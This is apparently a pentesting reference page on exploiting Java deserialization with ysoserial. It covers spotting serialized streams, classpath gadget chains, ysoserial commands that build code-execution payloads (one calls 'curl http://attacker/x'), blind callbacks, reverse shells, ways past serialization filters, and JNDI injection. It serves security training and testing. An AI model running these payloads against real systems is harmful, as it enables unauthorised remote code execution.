---
title: "Java deserialization: readObject gadget chains with ysoserial"
description: "Exploiting Java deserialization: recognizing the stream, ObjectInputStream.readObject sinks, assembling gadget chains with ysoserial, and common entry points like HTTP parameters, RMI, and JMX."
keywords:
  - java deserialization
  - readObject
  - ysoserial
  - gadget chain
  - ObjectInputStream
---

# Java deserialization

Java deserialization turns a byte stream back into objects via `ObjectInputStream.readObject()`. During reconstruction the JVM runs `readObject`, `readResolve`, and related callbacks on the rebuilt objects, and certain library classes perform dangerous work (reflection, method invocation, template compilation) inside those callbacks. Chaining them reaches **remote code execution**, and the chain is built from gadget classes already on the application's classpath.

## Recognizing the stream

Serialized Java starts with the magic bytes `AC ED 00 05`. Base64-encoded, that is a leading `rO0`; gzipped-then-base64 is common too (`H4sI`). Look in cookies, hidden form fields, `viewstate`-style tokens, custom headers, RMI/JMX/JNDI traffic, and any endpoint taking a base64 blob.

## The sink and the gadgets

The sink is any `readObject()` (or framework wrapper) fed untrusted bytes. The attacker cannot add classes to the server, so exploitation depends on **what is already on the classpath**: Commons-Collections, Commons-BeanUtils, Spring, Groovy, Hibernate, Rome, and others ship classes whose deserialization callbacks can be chained into reflection that calls `Runtime.exec`. Assemble these with **ysoserial**:

```bash
# Pick the payload matching a library on the target's classpath
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
java -jar ysoserial.jar CommonsBeanutils1 'curl http://attacker/x' | base64
java -jar ysoserial.jar Groovy1 'id'
```

Deliver `payload.bin` to the sink in the shape it expects (raw bytes, base64, gzip+base64). When output is not returned, use a command that calls back (DNS, HTTP) or a reverse shell; test blind with a collaborator/OOB interaction first.

## Common entry points

- **HTTP**: base64 blobs in cookies, parameters, or headers handed to `readObject`.
- **RMI / JMX / JMS**: remote invocation protocols that deserialize arguments; `marshalsec` helps here.
- **JNDI injection**: a deserialization or lookup that resolves an attacker LDAP/RMI URL, fetching a remote factory (the Log4Shell-style vector), useful when no local gadget fits.
- **T3 (WebLogic), and other app-server protocols** with their own serialized wire formats.

## Exploitation notes

- Match the gadget to a library *version* on the classpath; `CommonsCollections1` through `7` target different versions, so try several.
- JEP 290 serialization filters and allowlists may block known gadgets; enumerate the classpath for an unfiltered chain, or pivot to JNDI injection which does not need a local gadget.
- For detection without a working chain, a `URLDNS` payload triggers a DNS lookup on deserialization, confirming the sink blindly.

## Tools

- **ysoserial**: the standard gadget-chain generator.
- **marshalsec**: RMI/JNDI/JMX and alternative formats.

## References

- PortSwigger Web Security Academy: Insecure deserialization (Java)
- ysoserial project
